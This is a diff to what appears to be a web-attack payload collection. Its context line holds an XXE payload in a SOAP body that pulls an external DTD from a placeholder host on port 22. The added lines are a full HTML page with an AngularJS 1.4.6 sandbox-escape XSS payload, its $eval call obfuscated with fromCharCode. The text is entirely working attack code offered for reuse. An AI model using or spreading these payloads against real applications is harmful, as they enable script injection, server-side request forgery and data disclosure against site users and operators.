@@ -142,3 +142,24 @@ FTP
 Inside SOAP body
 ---------------------------
 <soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
+
+#angularjs
+
+<html>
+<head> 
+<meta charset="utf-8">
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script>
+</head>
+<body>
+<!--
+    'a'.constructor.prototype.charAt=[].join;
+    $eval('x=alert(1)')
+-->
+<div ng-app>
+{{
+    ({}.toString()).constructor.prototype.charAt=[].join;
+ $eval(({}.toString()).constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41))
+}}
+</div>
+</body>
+</html>
